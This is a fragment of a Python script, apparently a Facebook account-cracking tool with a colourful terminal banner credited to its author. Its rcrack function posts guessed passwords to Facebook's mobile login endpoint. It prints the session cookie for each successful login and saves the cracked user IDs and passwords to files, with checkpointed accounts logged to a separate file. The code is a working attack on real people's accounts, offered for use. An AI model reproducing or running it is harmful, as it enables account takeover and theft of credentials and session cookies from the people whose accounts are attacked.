...
\x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: ✰ƑƑ✰𝙈𝙀𝙃𝙀𝘿𝙄✰ƑƑ✰
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mMEHEDI-CYBER-404
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[✰ƑƑ✰𝙈𝙀𝙃𝙀𝘿𝙄✰ƑƑ✰-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/✰ƑƑ✰𝙈𝙀𝙃𝙀𝘿𝙄✰ƑƑ✰-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[✰ƑƑ✰𝙈𝙀𝙃𝙀𝘿𝙄✰ƑƑ✰-CP💔] {uid} • {ps}")
                open('/sdcard/✰ƑƑ✰𝙈𝙀𝙃𝙀𝘿𝙄✰ƑƑ✰-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
